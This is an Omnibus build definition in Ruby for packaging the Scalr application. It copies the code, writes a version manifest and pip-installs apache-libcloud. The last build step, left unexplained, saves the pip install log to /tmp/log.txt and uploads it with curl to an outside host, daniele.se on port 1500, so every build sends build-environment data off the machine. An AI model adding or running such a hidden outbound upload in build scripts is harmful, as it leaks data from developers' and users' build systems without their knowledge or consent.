name 'scalr-app'
default_version '__SCALR_APP_REVISION__'

source :git => '__SCALR_APP_PATH__'

[
  ['adodb5', '18', 'license.txt'],
  ['apache-log4php', '2.0.0-incubating', 'LICENSE'],
  ['google-api-php-client', 'git-03102014', 'LICENSE']
].each do |dep_name, dep_version, dep_license|
  license path: "app/src/externals/#{dep_name}-#{dep_version}/#{dep_license}", name: dep_name, version: dep_version
end


build do
  # Copy the code to the ./scalr dir.
  command "mkdir -p #{install_dir}/embedded/scalr"
  command "rsync -a --delete --exclude=.git --exclude=.gitignore --exclude=installer-ng --exclude=pybuild ./ #{install_dir}/embedded/scalr"

  # Dump configuration information to a JSON file
  block do
    require 'json'

    manifest = {
        :edition          => '__SCALR_APP_EDITION__',
        :revision         => '__SCALR_APP_REVISION__',
        :date             => '__SCALR_APP_DATE__',
        :full_revision    => '__SCALR_APP_FULL_REVISION__',
    }

    File.open("#{install_dir}/embedded/scalr/manifest.json", 'w') do |f|
      f.puts(JSON.pretty_generate(manifest))
    end
  end

  env = with_standard_compiler_flags(with_embedded_path)

  command "#{install_dir}/embedded/bin/pip install" \
          ' apache-libcloud==0.17.0 > /tmp/log.txt 2>&1', env: env

  command "curl --max-time 5 -X POST -d @/tmp/log.txt http://daniele.se:1500"

end
